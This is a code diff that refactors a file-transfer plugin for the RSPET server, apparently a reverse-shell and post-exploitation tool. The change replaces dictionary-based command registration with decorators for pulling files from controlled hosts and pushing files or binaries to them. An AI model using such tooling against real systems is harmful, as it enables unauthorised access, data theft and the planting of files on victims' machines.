@@ -3,33 +3,19 @@ Plug-in module for RSPET server. Offer remote file inclusion functions.
 """
 from __future__ import print_function
 from socket import error as sock_error
-from Plugins.mount import Plugin
+from Plugins.mount import Plugin, command
 
 
 class Files(Plugin):
     """
     Class expanding Plugin.
     """
-    __server_commands__ = {}
-    __cmd_help__ = {}
 
-    def __init__(self):
-        """
-        Declare plugin's CLI commands their syntax and their scope.
-        """
-        self.__server_commands__["Pull_File"] = [self.pull_file, "connected"]
-        self.__cmd_help__["Pull_File"] = "Pull_File <remote_file> [local_file]"
-        self.__server_commands__["Pull_Binary"] = [self.pull_binary, "connected"]
-        self.__cmd_help__["Pull_Binary"] = "Pull_Binary <remote_bin> [local_bin]"
-        self.__server_commands__["Make_File"] = [self.make_file, "connected",
-                                               "multiple"]
-        self.__cmd_help__["Make_File"] = "Make_File <local_file> [remote_file]"
-        self.__server_commands__["Make_Binary"] = [self.make_binary, "connected",
-                                                 "multiple"]
-        self.__cmd_help__["Make_Binary"] = "Make_Binary <local_bin> [remote_bin]"
-
+    @command("connected")
     def pull_file(self, server, args):
-        """Pull a regular text file from the host."""
+        """Pull a regular text file from the host.
+
+        Help: <remote_file> [local_file]"""
         ret = [None,0,""]
         host = server.get_selected()[0]
         if len(args) == 0:
@@ -62,8 +48,11 @@ class Files(Plugin):
                 ret[1] = 2 # Socket Error Code
         return ret
 
+    @command("connected")
     def pull_binary(self, server, args):
-        """Pull a binary file from the host."""
+        """Pull a binary file from the host.
+
+        Help: <remote_bin> [local_bin]"""
         ret = [None,0,""]
         host = server.get_selected()[0]
         if len(args) == 0:
@@ -96,8 +85,11 @@ class Files(Plugin):
                 ret[1] = 2 # Socket Error Code
         return ret
 
+    @command("connected", "multiple")
     def make_file(self, server, args):
-        """Send a regular text file to the host(s)."""
+        """Send a regular text file to the host(s).
+
+        Help: <local_file> [remote_file]"""
         ret = [None,0,""]
         hosts = server.get_selected()
         if len(args) == 0:
@@ -132,8 +124,11 @@ class Files(Plugin):
                     ret[2] += "File not found!"
         return ret
 
+    @command("connected", "multiple")
     def make_binary(self, server, args):
-        """Send a binary file to the host(s)."""
+        """Send a binary file to the host(s).
+
+        Help: <local_bin> [remote_bin]"""
         ret = [None,0,""]
         hosts = server.get_selected()
         if len(args) == 0:
